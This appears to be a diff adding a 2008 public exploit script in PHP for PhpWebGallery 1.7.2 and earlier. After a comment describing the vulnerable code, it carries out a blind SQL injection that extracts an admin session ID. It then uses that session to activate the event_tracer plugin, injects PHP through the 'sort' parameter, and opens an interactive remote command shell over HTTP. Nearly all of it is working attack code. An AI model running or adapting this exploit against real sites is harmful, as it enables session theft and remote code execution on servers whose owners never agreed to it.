@@ -1,0 +1,172 @@
+<?php
+
+/*
+	------------------------------------------------------------------------
+	PhpWebGallery <= 1.7.2 Remote Session Hijacking / Code Execution Exploit
+	------------------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.phpwebgallery.net/
+	details..: works with at least two rows in _comments table
+	
+	This PoC was written for educational purpose. Use it at your own risk.
+	Author will be not responsible for any damage.
+	
+	[-] vulnerable code in /plugins/event_tracer/event_list.php
+	
+	60.	$sort= isset($_GET['sort']) ? $_GET['sort'] : 1;
+	61.	usort(
+	62.	  $events,
+	63.	  create_function( '$a,$b', 'return $a['.$sort.']>$b['.$sort.'];' )
+	64.	  );
+	
+	An attacker could be able to inject and execute PHP code through $_GET['sort'], that is passed
+	to create_function() at line 63 (see http://www.securityfocus.com/bid/31398). Only admin can
+	access to the plugins management interface, but the attacker might be able to retrieve a valid
+	admin session id using the SQL injection bug in comments.php (see lines 325-340)
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout",5);
+
+define(STDIN, fopen("php://stdin", "r"));
+define(PATTERN, "/<span class=\"author\">(.*)<\/span> -/");
+
+function http_send($host, $packet)
+{
+	$sock = fsockopen($host, 80);
+	while (!$sock)
+	{
+		print "\n[-] No response from {$host}:80 Trying again...\n";
+		$sock = fsockopen($host, 80);
+	}
+	fputs($sock, $packet);
+	while (!feof($sock)) $resp .= fread($sock, 1024);
+	fclose($sock);
+	return $resp;
+}
+
+function check_target()
+{
+	global $host, $path, $prefix, $default_record;
+	
+	$packet  = "GET {$path}comments.php?sort_by=%s HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Cookie: pwg_id=".md5("foo")."\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+
+	preg_match("/FROM (.*)image_category/", http_send($host, sprintf($packet, "foo")), $match);
+	$prefix = $match[1];
+	
+	preg_match(PATTERN, http_send($host, sprintf($packet, "id/**/LIMIT/**/1/*")), $match);
+	$default_record = $match[1];
+	
+	preg_match(PATTERN, http_send($host, sprintf($packet, "author/**/LIMIT/**/1/*")), $match);
+	if (!strlen($default_record) || $default_record == $match[1]) die("\n[-] Exploit failed...\n");
+}
+
+function encodeSQL($sql)
+{
+	for ($i = 0, $n = strlen($sql); $i < $n; $i++) $encoded .= dechex(ord($sql[$i]));
+	return "CONCAT(0x{$encoded})";
+}
+
+function get_sid()
+{
+	global $host, $path, $prefix, $default_record;
+	
+	$chars = array_merge(array(0), range(48, 57), range(97, 102)); // 0-9 a-z
+	$index = 1;
+	$sid   = "";
+	
+	$packet  = "GET {$path}comments.php?sort_by=%s HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Cookie: pwg_id=".md5("foo")."\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+	
+	print "\n[-] Fetching admin SID: ";
+	
+	while (!strpos($sid, chr(0)))
+	{
+		for ($i = 0, $n = count($chars); $i <= $n; $i++)
+		{
+			if ($i == $n) die("\n\n[-] Exploit failed...try later!\n");
+			
+			$sql  = "(SELECT/**/IF(ASCII(SUBSTR(id,{$index},1))={$chars[$i]},author,id)/**/FROM/**/{$prefix}sessions".
+				"/**/WHERE/**/data/**/LIKE/**/".encodeSQL("pwg_uid|i:1;")."/**/LIMIT/**/1)/**/LIMIT/**/1/*";
+					
+			preg_match(PATTERN, http_send($host, sprintf($packet, $sql)), $match);	
+			if ($match[1] != $default_record) { $sid .= chr($chars[$i]); print chr($chars[$i]); break; }
+		}
+		
+		$index++;
+	}
+	
+	print "\n";
+	return $sid;
+}
+
+function check_plugin()
+{
+	global $host, $path, $sid;
+	
+	$packet  = "GET {$path}%s HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Cookie: pwg_id={$sid}\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+	
+	// check if the event_tracer plugin isn't installed
+	if (preg_match("/not active/", http_send($host, sprintf($packet, "admin.php?page=plugin&section=event_tracer/event_list.php"))))
+	{
+		http_send($host, sprintf($packet, "admin.php?page=plugins&plugin=event_tracer&action=install"));
+		http_send($host, sprintf($packet, "admin.php?page=plugins&plugin=event_tracer&action=activate"));
+	}	
+}
+
+print "\n+---------------------------------------------------------------------------+";
+print "\n| PhpWebGallery <= 1.7.2 Session Hijacking / Code Execution Exploit by EgiX |";
+print "\n+---------------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage...: php $argv[0] host path [sid]\n";
+	print "\nhost....: target server (ip/hostname)";
+	print "\npath....: path to PhpWebGallery directory";
+	print "\nsid.....: a valid admin session id\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+check_target();
+
+$sid = (isset($argv[3])) ? $argv[3] : get_sid();
+
+check_plugin();
+
+$code	 = "0];}error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;%%23";
+$packet  = "GET {$path}admin.php?page=plugin&section=event_tracer/event_list.php&sort={$code} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: pwg_id={$sid}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+	print "\nphpwebgallery-shell# ";
+	$cmd = trim(fgets(STDIN));
+	if ($cmd != "exit")
+	{
+		$response = http_send($host, sprintf($packet, base64_encode($cmd)));
+		preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed...\n");
+	}
+	else break;
+}
+
+?>
+
+# milw0rm.com [2008-10-14]
